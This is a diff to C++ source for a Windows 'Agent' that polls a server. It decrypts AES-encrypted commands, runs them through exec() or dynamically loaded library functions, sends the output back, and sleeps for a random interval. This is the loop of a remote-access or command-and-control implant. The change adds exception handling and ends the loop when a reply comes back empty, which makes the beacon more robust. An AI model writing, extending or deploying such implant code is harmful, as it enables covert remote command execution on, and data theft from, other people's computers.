@@ -146,56 +146,69 @@ void Agent::GetRequestFromServer()
 		recvbuf[0] = '\0';
 		string message = string(REQUEST_STRING);
 
-		//send and receive messages
-		SendMessageToServer(message.c_str(), message.size(), (char*)"3", true);
-		ReciveMessage();
-
-		string req = string(recvbuf);
-		string x = aes.Decrypt(req);
-		if (!x.empty() && x.size() != 2)
+		try
 		{
-			vector<string> res = split(x);
-			vector<string>::iterator it = res.begin();
+			//send and receive messages
+			SendMessageToServer(message.c_str(), message.size(), (char*)"3", true);
+			ReciveMessage();
 
-			// Take action from command
-			if (!strcmp(it->c_str(), "3"))
+
+			string req = string(recvbuf);
+			if (req.empty())
 			{
-				string responce;
+				Cleanup();
+				break;
+			}
+			string x = aes.Decrypt(req);
+			if (!x.empty() && x.size() != 2)
+			{
+				vector<string> res = split(x);
+				vector<string>::iterator it = res.begin();
 
-				++it;
-				string todo = *it;
-				++it;
-				if (!todo.compare("cmd"))
+				// Take action from command
+				if (!strcmp(it->c_str(), "3"))
 				{
-					string action = *it;
-					responce = exec(action);
-				}
-				else if (!todo.compare("func"))
-				{
-					string library = *it;
-					string func = *(++it);
-					string cmd = *(++it);
-					while (it != res.end())
+					string responce;
+
+					++it;
+					string todo = *it;
+					++it;
+					if (!todo.compare("cmd"))
 					{
-						cmd.append(*(++it));
+						string action = *it;
+						responce = exec(action);
 					}
-					responce = runDynamicFunction(library, func, cmd);
-				}
+					else if (!todo.compare("func"))
+					{
+						string library = *it;
+						string func = *(++it);
+						string cmd = *(++it);
+						while (it != res.end())
+						{
+							cmd.append(*(++it));
+						}
+						responce = runDynamicFunction(library, func, cmd);
+					}
 
-				if (!responce.empty())
-				{
-					recvbuf[0] = '\0';
-					string message = string(responce);
+					if (!responce.empty())
+					{
+						recvbuf[0] = '\0';
+						string message = string(responce);
 
-					//send and receive messages
-					SendMessageToServer(message.c_str(), message.size(), (char*)"4", true);
-					ReciveMessage();
+						//send and receive messages
+						SendMessageToServer(message.c_str(), message.size(), (char*)"4", true);
+						ReciveMessage();
+					}
 				}
 			}
-		}
-		double r = ((double)rand() / (RAND_MAX));
+			double r = ((double)rand() / (RAND_MAX));
 
-		Sleep(r * 30 * 1000);
+			Sleep(r * 30 * 1000);
+		}
+		catch (...)
+		{
+			break;
+		}
 	}
 }
 /*
@@ -256,7 +269,8 @@ void Agent::ReciveMessage()
 {
 	// Receive until the peer closes the connection
 	//do {
-
+	try
+	{
 		iResult = mySocket.ReciveFromServer(recvbuf, recvbuflen);
 		if (iResult > 0)
 			printf("Bytes received: %d\n", iResult);
@@ -264,7 +278,11 @@ void Agent::ReciveMessage()
 			printf("Connection closed\n");
 		else
 			printf("recv failed with error: %d\n", WSAGetLastError());
+	}
+	catch (...)
+	{
 
+	}
 	//} while (iResult > 0);
 }
 /*
